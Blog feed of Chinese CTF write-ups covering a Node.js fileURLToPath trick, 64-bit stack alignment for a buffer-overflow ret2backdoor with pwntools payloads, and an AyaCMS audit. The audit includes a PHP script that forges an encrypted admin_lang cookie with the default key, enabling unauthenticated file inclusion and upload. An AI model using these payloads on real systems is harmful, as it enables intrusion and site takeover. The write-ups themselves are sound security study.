<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isURLInstance</span> = (<span class="params">input</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> input != <span class="literal">null</span> &amp;&amp; input.<span class="property">href</span> &amp;&amp; input.<span class="property">origin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果参数对象存在<code>href</code>和<code>origin</code>属性将返回真，此时返回<code>fileURLToPath</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>fileURLToPath</code>函数内部终于出现了<code>new URL</code>，好耶</p>
<p>第一个<code>if</code>要求参数对象属性必须得是字符串类型才给我们<code>new</code>，好在这个要求无伤大雅。</p>
<p>此时它要求我们的<code>protocol</code>属性为<code>file:</code>，否则将会抛出一个错误。</p>
<p>接下来判断运行系统是否为Windows系统，在环境是Linux的情况下，跟进<code>getPathFromURLPosix</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果参数对象的<code>hostname</code>属性不为空的话将再次抛出一个错误，因此我们需要构造一个空的<code>hostname</code>属性，好让函数继续进行下去。</p>
<p>而剩下的代码和<code>decodeURIComponent</code>就是在帮我们以url解码的方式转换<code>pathname</code>属性了。</p>
<p><img src="/images/20220925001928.png"></p>
<p>本地验证大成功。</p>
<p>这个trick真的很有意思，因为它看似简单，但需要深入源码分析才能明白它的原理。</p>
]]></content>
      <tags>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>栈平衡详解</title>
    <url>/2022/10/07/stack_balance/</url>
    <content><![CDATA[<p>绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。</p>
<span id="more"></span>

<h1><span id="概念">概念</span></h1><blockquote>
<p>函数如果要返回父程序，则在堆栈中进行操作的时候，一定要在RET指令之前，将ESP指向函数入栈前的地址。</p>
<p>每调用一个CALL，就会开辟一个新的栈空间，如果没有栈平衡功能的实现，那么很容易会破坏其它栈里的数据，导致程序崩溃。</p>
<p>在Ubuntu18以上环境的64位程序，当调用<code>printf</code>或是<code>system</code>时，需要保证RSP &amp; 0xf == 0，即16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。</p>
</blockquote>
<h1><span id="示例">示例</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以一个简单的栈溢出程序为例，在<code>Ubuntu 18.04</code>系统上进行64位编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; gcc exp.c -o exp -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure>

<p>为了方便演示关闭了PIE保护和canary。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; checksec --file=exp     </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64 Symbols	  No	0		1		exp</span><br></pre></td></tr></table></figure>

<p>搓个人畜无害的exp，attach上gdb进行动态调试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400571</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/images/20221006230718.png"></p>
<p>可以看到溢出利用是成功的，至此一切正常。继续单步跳过</p>
<p><img src="/images/20221006231052.png"></p>
<p>步入<code>system</code>调用后，整个程序就寄在了MOVAPS指令<sup>[1]</sup>，同时抛出错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault。</span><br></pre></td></tr></table></figure>

<p>因为MOVAPS指令要求目标操作数是内存操作数时对齐16字节边界，如果没对齐会就会出现分段错误。</p>
<blockquote>
<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated. </p>
</blockquote>
<p>回头看现在栈上的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp   0x7fff001f9818 -&gt; 0x7fff001f9b30 &lt;- 0x0</span><br></pre></td></tr></table></figure>

<p>此时RSP寄存器的值是0x7fff001f9818，并没有对齐16字节，即强行跳转后门函数破坏了栈平衡，需要完善栈溢出的操作。</p>
<p>一种常见的解决方法是在调用后门函数之前塞个RET指令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x40054b</span>) + p64(<span class="number">0x400571</span>)</span><br></pre></td></tr></table></figure>

<p>RET指令可以看作等效于POP EIP（实际上没有这个指令<sup>[2]</sup>），也即先弹出栈顶的数据（RSP+8），之后再压栈，将RSP的值对齐16字节完成栈平衡。否则会因为此处意★义★不★明的PUSH造成函数入栈后RSP的值-8。</p>
<p><img src="/images/20221007230240.png"></p>
<p>可以看到RSP的值在PUSH后变回了为0x7ffd49459a20。</p>
<p><img src="/images/20221007232057.png"></p>
<p>单步跟进到MOVAPS指令，此时RSP寄存器的值为0x7ffd49459680，对齐16字节。</p>
<p><img src="/images/20221007233355.png"></p>
<p>本地成功打通。</p>
<p><img src="/images/20221007233711.png"></p>
<p>而难以定位RET指令的时候（如开启了PIE保护），既然此处的思想是用POP抵消掉PUSH来保证栈平衡，我们不妨做得更绝一点，要是直接舍弃意★义★不★明的PUSH呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400572</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/20221007234640.png"></p>
<p>可以看到仍然保证了栈平衡。本地成功打通。</p>
<p><img src="/images/20221007235102.png"></p>
<h1><span id="外部链接">外部链接</span></h1><p>[1] <a href="https://www.felixcloutier.com/x86/movaps">Move Aligned Packed Single-Precision Floating-Point Values</a></p>
<p>[2] <a href="https://stackoverflow.com/questions/56676840/is-pop-eip-legal-instruction">Is pop eip legal instruction?</a></p>
]]></content>
      <tags>
        <tag>pwn-stackbalance</tag>
      </tags>
  </entry>
  <entry>
    <title>通关ayacms</title>
    <url>/2022/12/05/ayacms/</url>
    <content><![CDATA[<p>这周末打NCTF从零开始审了个cms框架，经典没找到文章，硬审，成功审到漏洞，结果最后一头创死在<code>include</code>门前（离打通就差五行代码！五行！痛！痛！）好在这两天也并不是一无所获，以此文章记录我在代码审计时的思路和所做的尝试。</p>
<span id="more"></span>

<h1><span id="思路分析">思路分析</span></h1><p>初步判断，题目是主要删除了aya/moudle/member文件夹的纯净ayacms框架，版本为v3.1.2<sup>[1]</sup>。</p>
<p>这种删子行为直接导致我们无法进行像登录、注册之类的和个人信息有关的所有操作了。</p>
<p>而github上已知的漏洞利用<sup>[2]</sup>无一例外都存在“已登录”这个大前提（悲）。</p>
<p>这下虽然不能直接照搬已有的payload了，大佬们走过的路仍然会带给我们很多启发。</p>
<p>分析大佬们的payload可以事先得出以下几个结论：</p>
<p><strong>进行敏感操作的<code>/aya/module/admin/xxx.inc.php</code>都存在授权验证，无法直接访问</strong></p>
<p><img src="/images/20221205154721.png"></p>
<p><strong>根目录下的<code>admin.php</code>等入口文件在执行过程中加上了授权常量的定义，即敏感操作只能由此类入口文件包含执行（类似于SSRF）</strong></p>
<p><img src="/images/20221205154550.png"></p>
<p><strong>通过入口文件<code>admin.php</code>传参<code>?action</code>可包含<code>/aya/module/admin/</code>下的<code>xxx.inc.php</code>文件</strong></p>
<p><img src="/images/20221205160148.png"></p>
<p><img src="/images/20221205160301.png"></p>
<p>但在没有进行后台登录的情况下，传参<code>login</code>以外的action都会被遣返回登录界面。</p>
<p><img src="/images/20221205195451.png"></p>
<p>粗略地调试一下，得知<code>$USER</code>数组即为判断用户是否登录的标志。</p>
<p>根目录下<code>ajax.php</code>里的文件上传也存在登录验证。</p>
<p><img src="/images/20221205165459.png"></p>
<p>当时结合以前伪造cookie的经验，坚定地认为只要能伪造cookie登录就能打通。结果忙活一晚上，<code>$USER</code>的数据库查询硬是没绕过去。。。</p>
<p>不管怎样，还是先看看相关代码片段吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin.inc.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_userid</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$_username</span> = <span class="variable">$_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$_USER</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_auth</span> = <span class="title function_ invoke__">get_cookie</span>(<span class="string">&#x27;auth&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$_auth</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\t&quot;</span>, <span class="title function_ invoke__">decrypt</span>(<span class="variable">$_auth</span>));</span><br><span class="line">	<span class="variable">$_userid</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">0</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_auth</span>[<span class="number">0</span>]) : <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$_username</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">1</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_auth</span>[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$_password</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">2</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_auth</span>[<span class="number">2</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_userid</span>) &#123;</span><br><span class="line">		<span class="variable">$_USER</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get_one</span>(<span class="string">&quot;SELECT * FROM <span class="subst">&#123;$db-&gt;pre&#125;</span>member WHERE groupid=2 &amp;&amp; itemid=<span class="subst">$_userid</span>&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$_USER</span> <span class="keyword">or</span> <span class="variable">$_USER</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="variable">$_password</span>) &#123;</span><br><span class="line">			<span class="variable">$_userid</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="title function_ invoke__">set_cookie</span>(<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">			<span class="keyword">unset</span>(<span class="variable">$_USER</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$USER</span> = <span class="variable">$_userid</span> &gt; <span class="number">0</span> ? <span class="variable">$_USER</span> : <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;itemid&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;~Guest&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;groupid&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_auth</span>, <span class="variable">$_userid</span>, <span class="variable">$_username</span>, <span class="variable">$_password</span>, <span class="variable">$_USER</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这几行其实才是打通题目最关键的代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_lang</span> = <span class="title function_ invoke__">get_cookie</span>(<span class="string">&#x27;admin_lang&#x27;</span>))</span><br><span class="line">	<span class="variable">$_lang</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$_lang</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">empty</span>(<span class="variable">$_lang</span>) &amp;&amp; <span class="variable">$_lang</span> = <span class="variable">$LANG</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AYA_LANG&#x27;</span>, <span class="variable">$_lang</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span> = AYA_ROOT . <span class="string">&#x27;lang/&#x27;</span> . AYA_LANG . <span class="string">&#x27;.inc.php&#x27;</span>))</span><br><span class="line"></span><br><span class="line">	<span class="variable">$L</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// global.func.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$CFG</span>;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$CFG</span>[<span class="string">&#x27;cookie_pre&#x27;</span>] . <span class="variable">$var</span>; <span class="comment">// $CFG[&#x27;cookie_pre&#x27;] == &quot;aya_&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$var</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$var</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY;</span><br><span class="line">    <span class="variable">$rnd</span> = <span class="title function_ invoke__">random</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$rnd</span>[<span class="variable">$ctr</span>] . (<span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$rnd</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">kecrypt</span>(<span class="variable">$str</span>, <span class="variable">$key</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY; <span class="comment">// AYA_KEY == &quot;aaa&quot;（默认）</span></span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">kecrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>), <span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kecrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析相关代码可知，对于ayacms来说，用户登录即等同于传入名为<strong>aya_auth</strong>的cookie。</p>
<p><img src="/images/20221205171055.png"></p>
<p>后端接收到<strong>aya_auth</strong>的数据后，首先会调用<code>decrypt</code>函数解密，<code>txt</code>即为传入的cookie值，<code>AYA_KEY</code>则可直接拿到默认值<code>aaa</code>。</p>
<p>现在<code>decrypt</code>函数长啥样已经无所谓了，更重要的是他的<code>encrypt</code>函数能帮我们直接生成可控的cookie。</p>
<p>但即使成功构造cookie让<code>$_userid</code>短暂地置为了<code>1</code>，由于既不知道admin的密码，也不是默认密码，最后的数据库查询操作彻底把伪造<code>$USER</code>的方向堵死了。要不是<code>$_userid</code>被强制类型转换成了<code>intval</code>，可能还是有操作空间的说。而在这串代码下面五行左右的<code>include</code>敏感操作才是真正的突破口。</p>
<p>翻译翻译就是传入<strong>aya_admin_lang</strong>这个cookie，解密后将其路径拼接为一个php文件并包含，妥妥的危险操作。</p>
<p>再配合aya/module/admin/fst_upload.inc.php进行文件上传，即可拿下ayacms。</p>
<p><img src="/images/20221205204656.png"></p>
<h1><span id="利用脚本">利用脚本</span></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"><span class="variable">$length</span> = <span class="number">4</span>, <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hash</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$max</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$hash</span> .= <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$max</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kecrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY;</span><br><span class="line">    <span class="variable">$rnd</span> = <span class="title function_ invoke__">random</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$rnd</span>[<span class="variable">$ctr</span>] . (<span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$rnd</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">kecrypt</span>(<span class="variable">$str</span>, <span class="variable">$key</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encrypt(txt, key)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&quot;../module/admin/fst_upload&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/20221205222344.png"></p>
<h1><span id="外部链接">外部链接</span></h1><p>[1] ayacms源码：<a href="https://github.com/loadream/AyaCMS">https://github.com/loadream/AyaCMS</a></p>
<p>[2] ayacms漏洞issue：<a href="https://github.com/loadream/AyaCMS/issues">https://github.com/loadream/AyaCMS/issues</a></p>
]]></content>
      <tags>
        <tag>cms</tag>
      </tags>
  </entry>
</search>
